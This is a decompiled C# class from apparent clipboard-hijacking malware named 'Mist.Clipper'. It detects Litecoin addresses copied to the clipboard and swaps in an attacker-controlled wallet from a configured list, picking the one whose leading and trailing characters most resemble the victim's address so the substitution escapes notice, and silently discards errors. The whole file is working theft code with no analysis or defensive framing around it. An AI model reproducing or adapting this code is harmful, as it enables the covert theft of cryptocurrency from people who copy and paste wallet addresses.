using System;
using System.Collections.Generic;
using System.Linq;
using System.Text.RegularExpressions;
using System.Windows;

namespace Mist.Clipper
{
	// Token: 0x0200007D RID: 125
	internal class CheckLTC
	{
		// Token: 0x060002DE RID: 734 RVA: 0x000134A8 File Offset: 0x000116A8
		public static bool Clipregex(string clipboard)
		{
			string text = clipboard.Trim();
			return text.Length >= 26 && text.Length <= 34 && new Regex(CheckLTC.Key).IsMatch(text);
		}

		// Token: 0x060002DF RID: 735 RVA: 0x000134E8 File Offset: 0x000116E8
		internal static void SetsLTC(string originalClipboardText)
		{
			try
			{
				string b = originalClipboardText.Trim();
				HashSet<string> hashSet = new HashSet<string>();
				int num = 0;
				foreach (string text in Config.walletsltc.ToList<string>())
				{
					int num2 = CheckLTC.FirstCharFitNum(text, b);
					if (num2 >= num)
					{
						if (num2 == num)
						{
							hashSet.Add(text);
						}
						else if (num2 > num)
						{
							hashSet.Clear();
							num = num2;
							hashSet.Add(text);
							Clipboard.SetText(text);
						}
					}
				}
				int num3 = 0;
				foreach (string text2 in hashSet)
				{
					int num4 = CheckLTC.LastCharFitNum(text2, b);
					if (num4 > num3)
					{
						num3 = num4;
						Clipboard.SetText(text2);
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x060002E0 RID: 736 RVA: 0x00012DC0 File Offset: 0x00010FC0
		private static int LastCharFitNum(string a, string b)
		{
			int num = 0;
			bool flag = true;
			int num2 = 0;
			while (num2 < Math.Min(a.Length, b.Length) && flag)
			{
				if (a[a.Length - 1 - num2] != b[b.Length - 1 - num2])
				{
					flag = false;
				}
				else
				{
					num++;
				}
				num2++;
			}
			return num;
		}

		// Token: 0x060002E1 RID: 737 RVA: 0x00012E1C File Offset: 0x0001101C
		private static int FirstCharFitNum(string a, string b)
		{
			int num = 0;
			bool flag = true;
			int num2 = 0;
			while (num2 < Math.Min(a.Length, b.Length) && flag)
			{
				if (a[num2] != b[num2])
				{
					flag = false;
				}
				else
				{
					num++;
				}
				num2++;
			}
			return num;
		}

		// Token: 0x04000180 RID: 384
		public static string Key = "^(L|M)[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz].*$";
	}
}
